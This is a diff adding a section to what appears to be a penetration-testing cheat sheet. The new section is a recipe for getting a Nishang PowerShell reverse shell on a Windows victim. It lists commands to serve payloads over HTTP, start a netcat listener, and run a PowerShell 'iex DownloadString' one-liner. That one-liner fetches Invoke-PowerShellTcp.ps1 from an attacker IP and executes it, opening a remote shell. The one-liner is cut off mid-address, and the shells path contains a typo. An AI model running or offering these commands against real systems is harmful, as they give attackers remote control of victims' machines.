@@ -326,3 +326,23 @@ set target <Target URL>
 exploit
 ```
 
+
+
+## Reverse Shell using Nishang (Windows Victim Host)
+
+```
+# Installation
+sudo apt install nishang
+
+# Nishang Default Shells Location
+/usr/share/windows-binaries/nishnag/shells
+
+# Start a python http server to share the payloads
+python3 -m http.server 8080
+
+# Start a netcat listener
+nc -nlvp 1234
+
+# Download and execute the script in the victim host
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.6.228:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.6.2>
+```
